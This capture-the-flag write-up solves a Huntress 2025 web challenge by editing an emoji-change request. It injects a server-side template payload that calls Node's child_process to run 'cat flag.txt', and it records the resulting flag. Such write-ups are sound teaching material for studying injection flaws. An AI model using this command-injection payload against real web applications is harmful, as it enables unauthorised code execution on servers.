---
title: "Emotional"
date: 2025-11-26
categories:
  - Huntress
tags:
  - "Web"
  - "2025"
  - "Command Injection"
platform: Huntress 2025
competition_year: 2025
header:
  teaser: /assets/images/teasers/web.png
toc: true
toc_sticky: true
---

# 🌐 Emotional

|Category         |	Author                |
|-----------------|-----------------------|
|🌐 Web           |John Hammond           |

## Challenge Prompt

Don't be shy, show your emotions! Get emotional if you have to! Uncover the flag.

## Problem Type
- Command Injection

## Solve
Press F12

Run an emoji change

Right click to edit and resend

`Emoji=<%= process.mainModule.require('child_process').execSync('cat flag.txt').toString() %>`

F5 to refresh

Check the response panel for flag

## Flag
`flag{8c8e0e59d1292298b64c625b401e8cfa}`


<p align="right">(<a href="#top">back to top</a>)</p>
